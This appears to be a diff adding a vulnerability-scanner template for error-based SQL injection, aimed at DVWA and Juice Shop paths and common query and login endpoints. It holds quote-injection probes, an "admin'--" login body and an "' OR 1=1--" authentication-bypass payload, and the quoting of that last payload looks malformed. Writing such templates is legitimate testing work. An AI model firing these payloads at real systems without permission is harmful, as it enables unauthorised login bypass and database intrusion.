@@ -1,0 +1,86 @@
+id: hunt3r-sqli-error
+
+info:
+  name: SQL Injection - Error Based Detection
+  author: hunt3r
+  severity: high
+  description: Detects SQL injection via error responses. Tests common params and known DVWA/Juice Shop endpoints.
+  tags: sqli,injection,hunt3r
+  reference:
+    - https://portswigger.net/web-security/sql-injection
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/vulnerabilities/sqli/?id=1'&Submit=Submit"
+      - "{{BaseURL}}/vulnerabilities/sqli_blind/?id=1'&Submit=Submit"
+      - "{{BaseURL}}/rest/products/search?q=1'"
+      - "{{BaseURL}}/?id=1'"
+      - "{{BaseURL}}/?search=1'"
+      - "{{BaseURL}}/?q=1'"
+      - "{{BaseURL}}/search?q=1'"
+      - "{{BaseURL}}/api/products?q=1'"
+      - "{{BaseURL}}/items?id=1'"
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "You have an error in your SQL syntax"
+          - "Warning.*mysql_"
+          - "MySQLSyntaxErrorException"
+          - "ORA-[0-9]{5}"
+          - "Microsoft.*ODBC.*SQL Server"
+          - "SQLite3::query\\("
+          - "PostgreSQL.*ERROR"
+          - "Unclosed quotation mark"
+          - "SQLSTATE\\[HY000\\]"
+          - "sqlite3.OperationalError"
+          - "near \"1'\": syntax error"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/login.php"
+      - "{{BaseURL}}/login"
+      - "{{BaseURL}}/rest/user/login"
+      - "{{BaseURL}}/vulnerabilities/sqli/"
+
+    body: "username=admin'--&password=x&Login=Login"
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "You have an error in your SQL syntax"
+          - "Warning.*mysql_"
+          - "MySQLSyntaxErrorException"
+          - "SQLSTATE"
+          - "sqlite3.OperationalError"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/rest/user/login"
+
+    body: '{"email":"a@b.com'"'"' OR 1=1--","password":"x"}'
+    headers:
+      Content-Type: "application/json"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - "token"
+          - "authentication"
+        condition: or
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "Invalid email or password"
